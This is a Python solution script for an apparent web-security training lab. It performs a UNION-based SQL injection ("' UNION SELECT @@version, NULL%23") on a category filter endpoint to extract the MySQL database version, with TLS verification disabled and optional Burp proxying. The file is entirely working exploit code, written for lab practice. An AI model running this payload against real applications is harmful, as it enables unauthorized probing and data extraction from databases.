import requests
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection attack, querying the database type and version on MySQL and Microsoft"

def run(url, payload=None, proxies=None):
    """
    Executes SQL Injection Lab 4 to extract DB version on MySQL

    Args:
        url (str): Base URL of the lab (no path/query)
        payload (ignored): Not required for this lab
        proxies (dict, optional): Proxy config (e.g., Burp)

    Returns:
        bool: True if DB version found, False otherwise
    """
    path = "/filter?category=Accessories"
    sql_payload = "' UNION SELECT @@version, NULL%23"
    try:
        print("[+] Dumping the version of the database...")
        r = requests.get(url.rstrip('/') + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        soup = BeautifulSoup(res, 'html.parser')
        version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
        if version is None:
            return False
        else:
            print("[+] The database version is: " + version)
            return True
        return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
